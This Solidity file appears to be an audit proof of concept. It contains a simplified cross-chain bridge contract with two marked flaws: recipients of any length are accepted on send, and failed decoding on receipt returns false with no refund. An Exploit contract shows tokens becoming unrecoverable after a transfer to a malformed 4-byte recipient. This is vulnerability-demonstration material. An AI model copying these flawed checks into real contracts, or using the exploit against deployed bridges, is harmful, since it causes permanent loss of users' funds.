// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

contract TokiBridge {
    mapping(address => uint256) public sourceBalance;
    mapping(address => uint256) public destinationBalance;

    function seed(address user, uint256 amount) external {
        sourceBalance[user] += amount;
    }

    function transfer(bytes calldata to, uint256 amount) external {
        require(sourceBalance[msg.sender] >= amount, "balance");
        // @> VULN: non-empty, bounded bytes are accepted instead of 20-byte EVM address.
        require(to.length > 0 && to.length <= 1024, "recipient length");
        sourceBalance[msg.sender] -= amount;
    }

    function onRecv(bytes calldata to, uint256 amount, address /*source*/) external returns (bool) {
        if (to.length != 20) {
            // @> VULN: decode failure emits an unrecoverable branch with no refund payload.
            return false;
        }
        address recipient;
        assembly {
            recipient := shr(96, calldataload(to.offset))
        }
        destinationBalance[recipient] += amount;
        return true;
    }
}

contract Exploit {
    TokiBridge public bridge;
    uint256 public lost;
    bool public unrecoverable;

    constructor() {
        bridge = new TokiBridge();
    }

    function run() external {
        bridge.seed(address(this), 100);
        bytes memory malformedRecipient = hex"deadbeef";
        bridge.transfer(malformedRecipient, 100);
        unrecoverable = !bridge.onRecv(malformedRecipient, 100, address(this));
        lost = bridge.sourceBalance(address(this)) == 0 && bridge.destinationBalance(address(this)) == 0 ? 100 : 0;
        require(unrecoverable && lost == 100, "malformed recipient was recoverable");
    }
}
